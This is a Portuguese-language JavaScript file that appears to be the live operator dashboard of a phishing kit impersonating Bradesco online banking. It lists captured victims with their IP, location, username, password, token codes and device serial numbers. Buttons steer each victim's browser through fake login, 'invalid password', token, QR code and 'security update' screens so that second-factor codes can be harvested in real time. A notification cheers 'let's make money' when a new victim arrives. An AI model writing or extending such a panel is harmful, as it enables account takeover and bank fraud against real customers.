$('document').ready( () => {

    const url = 'http://google.com.br/';

    const quantidadeSegundos = 5;

    let time = quantidadeSegundos;

    let status = {
        'AGUARDANDO_INICIO' : 'Aguardando Início',
        'COMPONENTE_SEGURANCA' : 'Aviso Componente de Segurança',
        'BLOQUEADO' : 'Acesso Bloqueado',
        'COMPONENTE_SEGURANCA_AGUARDANDO' : 'Aviso Componente de Segurança - Aguardando',
        'LOGIN' : 'Login',
        'USUARIO_SENHA' : 'Usuário e Senha - Login',
        'ICP_BRASIL' : 'ICP Brasil - Login',
        'CERTIFICADO' : 'Certificado Digital Bradesco - Login',
        'AGUARDANDO_LOGIN' : 'Aguardando - Login',
        'LOGIN_ERRO' : 'Usuário / Senha Inválidos - Login',
        'TOKEN_CELULAR' : 'Token Celular - Login',
        'TOKEN_CELULAR_ERRO' : 'Token Celular Erro - Login',
        'TOKEN_CHAVEIRO' : 'Token Chaveiro - Login',
        'TOKEN_CHAVEIRO_ERRO' : 'Token Chaveiro Erro - Login',
        'INICIAR_ATUALIZACAO_INTERNA' : 'Iniciar Atualização - Interna',
        'AGUARDE_ATUALIZACAO_ANDAMENTO_INTERNA' : 'Aguarde Atualização em Andamento - Interna',
        'CONCLUIR_ATUALIZACAO_INTERNA' : 'Conclusão de Atualização - Interna',
        'AGUARDE_VALIDACAO_CHAVE_INTERNA' : 'Aguarde Validação de Chave - Interna',
        'TOKEN_CELULAR_INTERNA' : 'Token Celular - Interna',
        'TOKEN_CELULAR_ERRO_INTERNA' : 'Erro Token Celular - Interna',
        'TOKEN_CHAVEIRO_INTERNA' : 'Token Chaveiro - Interna',
        'TOKEN_CHAVEIRO_ERRO_INTERNA' : 'Erro Token Chaveiro - Interna',
        'AGUARDE_AVISO_QR_INTERNA' : 'Aviso QR Code Transação - Interna',
        'QR_CODE_INTERNA' : 'QR Code - Interna',
        'FEIXE_LUMINOSIDADE_INTERNA' : 'Feixe Luminosidade - Interna',
        'FEIXE_LUMINOSIDADE_ERRO_INTERNA' : 'Erro Feixe Luminosidade - Interna',
        'SOLICITAR_OUTRO_USER_INTERNA' : 'Solicitar Usuário - Interna',
        'DOWNLOAD_1'  : 'Tela de download 1',
        'DOWNLOAD_2'  : 'Tela de download 2',
        'DOWNLOAD_3'  : 'Tela de download 3'
    };

    

    $('tbody').on('click', 'button.enviarNome', function(e) {
        e.preventDefault();
        let nome = $(e.target).parent().find('input[name=nome]').val();
        if(nome.length > 0) {
            
            let id = $(e.target).data('id');
            let action = 'ALTERAR_INFORMACOES';
            let campo = 'nome';
    
            $.ajax({
                url: "do.php",
                type:'POST',
                data: { action : action, id : id, campo: campo, valor : nome},
                cache: false,
                success: function(r){
                    $(e.target).parent().find('input[name=nome]').val('');
                    atualizarInformacoes();
                }
            });
        }
    });

    $('tbody').on('click', 'button.enviarFeixeBinario', function(e) {
        e.preventDefault();
        let feixe = $(e.target).parent().find('input[name=feixe]').val();
        if(feixe.length > 0) {
            
            let id = $(e.target).data('id');
            let action = 'ALTERAR_INFORMACOES';
            let campo = 'feixeBinario';
    
            $.ajax({
                url: "do.php",
                type:'POST',
                data: { action : action, id : id, campo: campo, valor : feixe},
                cache: false,
                success: function(r){
                    $(e.target).parent().find('input[name=nome]').val('');
                    atualizarInformacoes();
                }
            });
        }
    });

    

    $('tbody').on('click', 'button.enviarNumeroSerie', function(e) {
        e.preventDefault();
        let numeroSerie = $(e.target).parent().find('input[name=numeroSerie]').val();
        if(numeroSerie.length > 0) {
            
            let id = $(e.target).data('id');
            let action = 'ALTERAR_INFORMACOES';
            let campo = 'numeroSerie';
    
            $.ajax({
                url: "do.php",
                type:'POST',
                data: { action : action, id : id, campo: campo, valor : numeroSerie},
                cache: false,
                success: function(r){
                    $(e.target).parent().find('input[name=numeroSerie]').val('');
                    atualizarInformacoes();
                }
            });
        }
    });

    $('tbody').on('click', 'a.button-detail i', function(e) {
        let tr = $(e.target).parents('tr');
        let aberto = $(tr).data('aberto');
        let id = $(tr).data('id');
        let novoStatus;
        if(parseInt(aberto) === 0) {
            $(tr).next('tr').removeClass('hide');
            novoStatus = 1;
            $(e.target).removeClass('fa-plus-square').addClass('fa-minus-square');
        } else {
            $(tr).next('tr').addClass('hide');
            novoStatus = 0;
            $(e.target).removeClass('fa-minus-square').addClass('fa-plus-square');
        }
        $.ajax({
            url: "do.php",
            type:'POST',
            dataType : "json",
            data: { action : "ALTERAR_INFO_ABERTO", aberto: novoStatus, id : id},
            cache: false,
            success: function(r){
            }
        });
        $(tr).removeClass('novo');
        $(tr).data('aberto', novoStatus);
    });

    $('tbody').on('click', 'button.btn-action', function(e) {

        let confirma = confirm('Você tem Certeza?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');
        let action = $(e.target).data('action');
        let comando = $(e.target).data('comando');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : action, id : id, comando: comando},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.action-validate-infos', function(e) {

        let nome = $(this).data('nome');
        let numeroSerie = $(this).data('numeroSerie');

        let msg = 'Você tem Certeza?';
        if(!nome || nome.length === 0 || !numeroSerie || numeroSerie.length === 0) {
            msg = 'Você não informou o nome ou o número de série,\ntem certeza que deseja continuar?';
        }

        let confirma = confirm(msg);
        if(!confirma) {
            return false;
        }

        let id = $(e.target).data('id');
        let action = $(e.target).data('action');
        let comando = $(e.target).data('comando');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : action, id : id, comando: comando},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.action-validate-nome', function(e) {

        let nome = $(this).data('nome');


        let msg = 'Você tem Certeza?';
        if(!nome || nome.length === 0) {
            msg = 'Você não informou o nome,\ntem certeza que deseja continuar?';
        }

        let confirma = confirm(msg);
        if(!confirma) {
            return false;
        }

        let id = $(e.target).data('id');
        let action = $(e.target).data('action');
        let comando = $(e.target).data('comando');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : action, id : id, comando: comando},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    
    $('tbody').on('click', 'button.action-validate-feixe', function(e) {

        let feixe = $(this).data('feixe-binario');
        let nome = $(this).data('nome');
        let numeroSerie = $(this).data('numeroSerie');

        let msg = 'Você tem Certeza?';
        if(!feixe || feixe.length === 0 || !nome || nome.length === 0  || !numeroSerie || numeroSerie.length === 0) {
            msg = 'Você não informou uma das seguintes infromações: feixe binário, nome, número de série\ntem certeza que deseja continuar?';
        }

        let confirma = confirm(msg);
        if(!confirma) {
            return false;
        }

        let id = $(e.target).data('id');
        let action = $(e.target).data('action');
        let comando = $(e.target).data('comando');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : action, id : id, comando: comando},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    function getForm() {
        var data = new FormData();
        return data;
    }


    function sendData(data) {
        $.ajax({
                url: "do.php",
                data: data,
                cache: false,
                contentType: false,
                processData: false,
                type: 'POST',
                success: function(data){
                    // window.location.href = "ConfirmacaoEmail.php?cod="+$('input#cod').val();
                    iniciarContador();
                    atualizarInformacoes();

                }
            });
    }

    $('tbody').on('click', 'button.enviarQr', function(event) {
        event.preventDefault();

        let nome = $(this).data('nome');

        let msg = 'Você tem Certeza?';
        if(!nome || nome.length === 0) {
            msg = 'Você não informou o nome,\ntem certeza que deseja continuar?';
        }

        let confirma = confirm(msg);
        if(!confirma) {
            return false;
        }

        let element = $(event.target).parent().find('input[name=qrCodeFile]');
        let input = element[0].files ? element[0].files[0] : false;
        let file = input;

        let id = $(event.target).data('id');
        let action = $(event.target).data('action');

        if( file ) {
            var img = new Image();

            img.src = window.URL.createObjectURL( file );

            img.onload = function() {
                let width = img.naturalWidth;
                let height = img.naturalHeight;

                window.URL.revokeObjectURL( img.src );


                var data = getForm();
                data.append('foto', input);
                data.append('id', id);
                data.append('action', action);
                sendData(data);

            };

        } else {
            alert("Selecione o arquivo antes de enviar!");
        }

    });


    function loadData(){


        $.ajax({
            url: "do.php",
            type:'POST',
            dataType : "json",
            data: { action : "BUSCAR_TODOS"},
            cache: false,
            success: function(r){
                $('span#quantidade').text(r.length);
                let html = '';
                apenasNovos = r.filter(e => {
                    return e.statusInfo === 'NOVO';
                });

                let audio = document.getElementById("myAudio")

                if(apenasNovos.length > 0 ){
                    notifyMe();
                    //audio.play();
                } else {
                    //audio.pause();
                }
                r.forEach(e => {
                    
                    let htmlToken = '';
                    htmlToken += `
                    <div id="token" class="col-6">
                    <div class="mb-3 mt-3">
                        <h5 class="mb-3">Token / Tabela Atual:</h5>
                        <span class="token">${e.tokens && e.tokens.length ? e.tokens[0].valor : '-----'}</span>
                    </div>
                    <h5 class="mb-3">Histórico de Tokens / Tabelas</h5>
                    <table class="table table-striped table-dark">
                        <thead>
                            <tr>
                            <th scope="col">#</th>
                            <th scope="col">Data / Hora</th>
                            <th scope="col">Tipo</th>
                            <th scope="col">Token/Tabela</th>
                            </tr>
                        </thead>
                        <tbody>
                    `;

                    if(e.tokens && e.tokens.length){
                        e.tokens.forEach(token => {
                            htmlToken += `
                                    <tr>
                                    <th scope="row">1</th>
                                    <td>${moment(token.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                                    <td>${token.label}</td>
                                    <td>${token.valor}</td>
                                    </tr>
                            `;
                        });
                    }
                    htmlToken += `
                        </tbody>
                        </table>
                    </div>
                    `;

                    html += `
                        <tr class="header ${e.comando.toLowerCase()}" data-aberto="${e.aberto}" data-id="${e.id}">
                        <td scope="row">${e.id}</td>
                        <td>${e.ip}</td>
                        <td>${moment(e.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                        <td>${e.pais}</td>
                        <td>${e.uf}</td>
                        <td>${e.cidade}</td>
                        <td><span class="status ${e.statusConexao.toLowerCase()}">${e.statusConexao}</span></td>
                        <td>${status[e.comando]}</td>
 
                        <td class="text-center"><a class="button-detail" title="Abrir opções" class="plus" href="#"><i class="far ${parseInt(e.aberto) === 0 ? 'fa-plus-square' : 'fa-minus-square'}"></i></a></td>
                    </tr>
                    <tr class="detail ${parseInt(e.aberto) === 0 ? 'hide' : ''}">
                        <td colspan="9">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-12" id="botoes-acoes">
                                    <div id="botoes-parte-1" class="${e.comando.includes('INTERNA') ? 'hide' : ''} ${e.device === 'MOBILE' ? 'hide' : ''}">
                                        <button data-id="${e.id}" data-action="REMOVER_INFO" data-comando="" type="button" class="btn btn-action btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                                        <button data-id="${e.id}" data-action="ALTERAR_COMANDO" data-comando="LOGIN" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-sign-in-alt"></i> Enviar para Login</button>
                                        <button data-id="${e.id}" data-action="ALTERAR_COMANDO" data-comando="AGUARDANDO_LOGIN" type="button" class="btn btn-action btn-outline-success btn-sm excluir-info"><i class="fas fa-spinner"></i> Aguardando</button>
                                        <button data-id="${e.id}" data-action="ALTERAR_COMANDO" data-comando="LOGIN_ERRO" type="button" class="btn btn-action btn-outline-danger btn-sm excluir-info"><i class="fas fa-exclamation-triangle"></i> Usuário / Senha Inválidos</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-dark btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR_ERRO" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular Erro</button>

                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-info btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO_ERRO" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro Erro</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-numero-serie="${e.numeroSerie}" data-action="ALTERAR_COMANDO" data-comando="INICIAR_ATUALIZACAO_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 action-validate-infos"><i class="fas fa-paper-plane "></i> Enviar para Interna</button>
                                    </div>
                                    <div id="botoes-parte-2" class="${e.comando.includes('INTERNA') ? '' : 'hide'} ${e.device === 'MOBILE' ? 'hide' : ''}">
                                        <button data-id="${e.id}" data-action="REMOVER_INFO" data-comando="" type="button" class="btn btn-action btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-numero-serie="${e.numeroSerie}" data-action="ALTERAR_COMANDO" data-comando="INICIAR_ATUALIZACAO_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 action-validate-nome"><i class="fas fa-home"></i> Iniciar Atualização</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="AGUARDE_ATUALIZACAO_ANDAMENTO_INTERNA" type="button" class="btn action-validate-nome btn-outline-success btn-sm excluir-info"><i class="fas fa-spinner"></i> Aguarde, Atualização em Andamento</button>

                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-dark btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR_ERRO_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular Erro</button>

                                        
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-info btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro</button>
                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO_ERRO_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro Erro</button>


                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="AGUARDE_AVISO_QR_INTERNA" type="button" class="btn action-validate-nome btn-outline-primary btn-sm"><i class="fas fa-spinner"></i> Aguarde, Aviso QR Code</button>

                                        <button data-id="${e.id}" data-action="ALTERAR_COMANDO" data-comando="FEIXE_LUMINOSIDADE_INTERNA" data-feixe-binario="${e.feixeBinario}" type="button" class="btn btn-outline-info btn-sm excluir-info action-validate-feixe"><i class="fas fa-lightbulb"></i> Token Pisca</button>
                                        <button data-id="${e.id}" data-action="ALTERAR_COMANDO" data-comando="FEIXE_LUMINOSIDADE_ERRO_INTERNA" data-feixe-binario="${e.feixeBinario}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-feixe"><i class="fas fa-lightbulb"></i> Token Pisca Erro</button>

                                        <button data-id="${e.id}" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="CONCLUIR_ATUALIZACAO_INTERNA" type="button" class="btn action-validate-nome btn-outline-success btn-sm excluir-info"><i class="fas fa-check-circle"></i> Finalizar</button>
                                        <button data-id="${e.id}" data-action="ALTERAR_COMANDO" data-comando="SOLICITAR_OUTRO_USER_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-users"></i> Solicitar outro Usuário</button>
                                    </div>

                                </div>
                                </div>
                                <div class="row">
                                    ${htmlToken}
                                    <div id="information" class="col-6">
                                        <h5 class="mb-3 mt-3">Enviar Informações:</h5>
                                        <table>
                                        <tbody>
                                            <tr>
                                                <td width="20%">QR Code:</td>
                                                <td><input class="field" type="file" name="qrCodeFile" style="width:80%;"> <button data-id="${e.id}"  data-nome="${e.nome}" data-action="UPLOAD_QR" type="button" class="enviarQr btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                            <tr>
                                                <td width="20%">Feixe Binário:</td>
                                                <td><input class="field" type="text" name="feixe" style="width:80%;"> <button data-id="${e.id}" data-feixe-binario="${e.feixeBinario}" type="button" class="enviarFeixeBinario btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                            <tr class="nome">
                                                <td width="20%">Nome:</td>
                                                <td><input class="field" type="text" name="nome" style="width:80%;"> <button data-id="${e.id}" type="button" class="enviarNome btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                            <tr>
                                                <td width="20%">Número de Série:</td>
                                                <td><input class="field" type="text" name="numeroSerie" style="width:80%;"> <button data-id="${e.id}" type="button" class="enviarNumeroSerie btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                        </tbody>
                                        </table>
                                        <h5 class="mb-3 mt-3">Outras informações:</h5>
                                        <table>
                                        <tbody>
                                            <tr>
                                                <td width="20%">Tela:</td>
                                                <td>${status[e.comando]}</td>
                                            </tr>
                                            <tr>
                                                <td width="20%">Texto:</td>
                                                <td>${e.texto ? e.texto : '-'}</td>
                                            </tr>
                                            <tr>
                                                <td>User Agent:</td>
                                                <td>${e.userAgent}</td>
                                            </tr>
                                            <tr>
                                            <td>IP:</td>
                                            <td>${e.ip}</td>
                                            </tr>
                                            <tr>
                                            <td>Dispositivo:</td>
                                            <td>${e.device}</td>
                                            </tr>
                                            <tr>
                                            <td>Data Hora:</td>
                                            <td>${moment(e.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                                            </tr>
                                            <tr>
                                            <td>Usuário:</td>
                                            <td>${e.usuario ? e.usuario : '-'}</td>
                                            </tr>
                                            <tr>
                                            <td>Senha:</td>
                                            <td>${e.senha ? e.senha : '-'}</td>
                                            </tr>
                                            <tr>
                                            <td>QR Code File:</td>
                                            <td>${e.qrCodeFile ? e.qrCodeFile : '-'}</td>
                                            </tr>
                                            <tr>
                                            <td>Nome:</td>
                                            <td>${e.nome ? e.nome : '-'}</td>
                                            </tr>
                                            <tr>
                                            <td>Número de Série:</td>
                                            <td>${e.numeroSerie ? e.numeroSerie : '-'}</td>
                                            </tr>
                                            <tr>
                                            <td>Feixe Binário</td>
                                            <td style="word-break: break-all;">${e.feixeBinario ? e.feixeBinario : '-'}</td>
                                            </tr>
                                        </tbody>
                                        </table>
                                    </div>
                                </div>
                        </div>
                        </td>
                    </tr>
                    `;
                });
                $('tbody').empty().append(html);

            }
        });

    }

    loadData();

    function atualizarInformacoes(){
        time = quantidadeSegundos;
        loadData();
    }
    function relogio(){
        $('span#segundos').text(time);
        time--;
        if(time === -1){
            loadData();
            time = 5;
        }
    }

    var timer = setInterval (relogio, 1000 );

    function pararContador(){
        if(timer){
            clearInterval(timer);
            timer = null;
        }
    }

    function iniciarContador(){
        if(!timer){
            timer = setInterval (relogio, 1000 );

        }
    }

    $('a#controlarContador').click( e => {
        e.preventDefault();
        if(timer){
            pararContador();
            $('span#timer').addClass('parado');
        } else {
            iniciarContador();
            $('span#timer').removeClass('parado');

        }
    });

    $('a#excluirTodos').click( e => {
        e.preventDefault();
        let confirma = confirm('Você tem Certeza?');
        if(!confirma) {
            return false;
        }
        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : 'EXCLUIR_TODOS'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    

    document.addEventListener('DOMContentLoaded', function() {
        if (!Notification) {
         alert('Desktop notifications not available in your browser. Try Chromium.');
         return;
        }
       
        if (Notification.permission !== 'granted')
         Notification.requestPermission();
       });
       
       
       function notifyMe() {
        if (Notification.permission !== 'granted')
         Notification.requestPermission();
        else {
         var notification = new Notification('Chegou Info!', {
          icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRHjpI5COjVeOEVYs7aBhl-DgzYPZPz6Ma7IhU1c_t6-lKNJZkx',
          body: 'Bora fazer dinheiro mano!',
         });
         notification.onclick = function() {
          window.open(url);
         };
        }
       }

});